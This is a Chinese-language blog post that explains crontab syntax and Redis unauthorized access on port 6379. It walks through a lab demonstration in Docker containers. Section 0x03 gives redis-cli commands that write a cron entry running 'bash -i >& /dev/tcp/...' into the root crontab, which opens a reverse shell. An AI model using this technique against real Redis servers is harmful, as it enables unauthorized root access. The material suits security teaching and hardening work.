---
layout: post
title: "利用Linux定时任务crontab反弹shell"
date: 2017-11-12
tags:
  Linux
  Redis
categories:
  Linux
---
# 0x01 定时任务
cron是linux中常用的定时任务，可以在无人工干预的情况下运行作业，通过crontab命令我们可以在固定的间隔时间执行指定的系统指令或shell脚本，这个命令在自动化运维中常常用来进行周期性的日志分析和数据备份等工作。
```
usage:	crontab [-u user] file
	crontab [ -u user ] [ -i ] { -e | -l | -r }
		(default operation is replace, per 1003.2)
	-e	(edit user's crontab)
	-l	(list user's crontab)
	-r	(delete user's crontab)
	-i	(prompt before deleting user's crontab)
```
crontab配置文件为``/etc/crontab``，存放执行的crontab脚本文件的路径为``/etc/cron.d``，存放每个用户的crontab任务的目录在debian系统中一般为``/var/spool/cron/crontabs``，centos系统中一般为``/var/spool/cron``

crontab文件一般格式为：
* 第1列分钟0～59
* 第2列小时0～23（0表示子夜）
* 第3列日1～31
* 第4列月1～12
* 第5列星期0～7（0和7表示星期天）
* 第6列要运行的命令

如下

```
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
```

此外还有一些简单的语法：

| 符号 | 含义 |
| :------: | :------: |
| * | 表示任意时间，00 12 * * * 则表示每月每周每日的12时执行 |
| - | 表示一个时间范围，00 11-13 * * * 则表示每月每周每日的11 12 13时整点执行 |
| , | 表示分隔时间段，30 11,13 * * * 则表示每月每周每日的11 13点半执行 |
| /n | 表示每隔n单位时间，*/10 * * * * 则表示每隔十分钟执行 |

使用centos的Docker镜像下进行测试：

![](https://github.com/c1h3ng/c1h3ng.github.io/blob/master/assets/images/crontab-test.png?raw=true)

# 0x02 redis未授权访问
redis是生产中常用的Nosql数据库，默认安装后无需认证即可使用，若未添加用户认证或未配置好防火墙规则，可导致6379端口暴露在公网，且无需认证，可远程连接配置不当的redis server，容易被恶意利用入侵服务器，如下某存在未授权访问漏洞的服务器：

![](https://github.com/c1h3ng/c1h3ng.github.io/blob/master/assets/images/redis-info.png?raw=true)

# 0x03 利用crontab反弹Shell
本地使用docker搭建的ubuntu镜像进行测试，ubuntu中redis为默认配置，无需认证即可登录：

![](https://github.com/c1h3ng/c1h3ng.github.io/blob/master/assets/images/redis-ubuntu.png?raw=true)

利用redis写定时任务反弹shell
```bash
172.17.0.2:6379> set shell "\n\n\n\n* * * * * bash -i >& /dev/tcp/172.17.0.1/1234 0>&1\n\n\n\n"
OK
172.17.0.2:6379> config set dir /var/spool/cron/crontabs/
OK
172.17.0.2:6379> config set dbfilename root
OK
172.17.0.2:6379> save
OK
```

![](https://github.com/c1h3ng/c1h3ng.github.io/blob/master/assets/images/redis-crontab.png?raw=true)

成功反弹shell：

![](https://github.com/c1h3ng/c1h3ng.github.io/blob/master/assets/images/crontabshell.png?raw=true)

如果config set过程报错，提示权限不够，很可能是redis被降权运行，没有权限对/var/spool/cron/目录进行写操作。
